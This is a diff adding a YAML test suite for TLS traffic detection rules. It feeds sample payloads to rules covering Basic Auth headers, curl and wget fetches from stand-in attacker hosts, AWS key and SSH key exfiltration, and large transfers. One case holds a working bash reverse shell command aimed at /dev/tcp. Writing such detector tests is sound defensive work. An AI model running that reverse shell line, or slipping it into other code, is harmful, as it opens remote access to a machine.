@@ -1,0 +1,79 @@
+suite: tls_patterns
+rules_path: ../../rules/tls-patterns.yaml
+tests:
+  - name: "HTTP Basic Auth header in TLS fires tls_http_basic_auth"
+    rule_id: tls_http_basic_auth
+    event:
+      type: tls
+      tls:
+        data: "GET /api HTTP/1.1\r\nAuthorization: Basic dXNlcjpwYXNz\r\n"
+    expect: alert
+    expect_severity: warning
+
+  - name: "TLS payload without credentials does not fire tls_http_basic_auth"
+    event:
+      type: tls
+      tls:
+        data: "GET /health HTTP/1.1\r\nHost: example.com\r\n"
+    expect: no_alert
+
+  - name: "curl User-Agent in TLS fires tls_suspicious_user_agent"
+    rule_id: tls_suspicious_user_agent
+    event:
+      type: tls
+      tls:
+        data: "GET / HTTP/1.1\r\nUser-Agent: curl/7.88.1\r\nHost: attacker.example\r\n"
+    expect: alert
+    expect_severity: warning
+
+  - name: "wget User-Agent in TLS fires tls_suspicious_user_agent"
+    rule_id: tls_suspicious_user_agent
+    event:
+      type: tls
+      tls:
+        data: "GET /payload HTTP/1.1\r\nUser-Agent: wget/1.21\r\nHost: evil.example\r\n"
+    expect: alert
+
+  - name: "AWS access key ID prefix in TLS fires tls_data_exfil_patterns"
+    rule_id: tls_data_exfil_patterns
+    event:
+      type: tls
+      tls:
+        data: "POST /upload HTTP/1.1\r\nAKIA1234EXAMPLE5678\r\n"
+    expect: alert
+    expect_severity: critical
+
+  - name: "SSH RSA public key in TLS fires tls_data_exfil_patterns"
+    rule_id: tls_data_exfil_patterns
+    event:
+      type: tls
+      tls:
+        data: "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC..."
+    expect: alert
+    expect_severity: critical
+
+  - name: "reverse shell indicator /bin/bash -i fires tls_reverse_shell_indicator"
+    rule_id: tls_reverse_shell_indicator
+    event:
+      type: tls
+      tls:
+        data: "/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+    expect: alert
+    expect_severity: critical
+
+  - name: "large TLS transfer (>64KB) fires tls_unexpected_large_transfer"
+    rule_id: tls_unexpected_large_transfer
+    event:
+      type: tls
+      tls:
+        data: "placeholder"
+        data_len: 70000
+    expect: alert
+    expect_severity: warning
+
+  - name: "normal JSON API response does not fire any TLS rule"
+    event:
+      type: tls
+      tls:
+        data: "{\"status\": \"ok\", \"data\": []}"
+    expect: no_alert
